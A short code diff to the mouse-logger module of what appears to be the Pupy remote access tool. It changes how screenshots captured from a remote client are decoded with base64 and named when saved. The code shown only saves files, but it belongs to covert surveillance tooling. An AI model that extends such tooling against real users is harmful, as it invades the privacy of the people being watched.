@@ -8,6 +8,7 @@ import traceback
 import time
 import os
 import os.path
+import base64
 from pupylib.utils.rpyc_utils import obtain, redirected_stdo
 
 def pil_save(filename, pixels, width, height):
@@ -67,8 +68,8 @@ class MouseLoggerModule(PupyModule):
                 self.success("%s screenshots taken"%len(screenshots_list))
                 for d, height, width, exe, win_title, buf in screenshots_list:
                     try:
-                        filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+str(unicode(win_title, errors="ignore")).replace(" ","_").replace("\\","").replace("/","")+"_"+str(d).replace(" ","_").replace(":","-")+".jpg")
-                        pil_save(filepath, buf, width, height)
+                        filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+win_title.decode("utf8",errors="ignore").replace(" ","_").replace("\\","").replace("/","")+"_"+d.replace(" ","_").replace(":","-")+".jpg")
+                        pil_save(filepath, base64.b64decode(buf), width, height)
                         self.info("screenshot saved to %s"%filepath)
                     except Exception as e:
                         self.error("Error saving a screenshot: %s"%str(e))
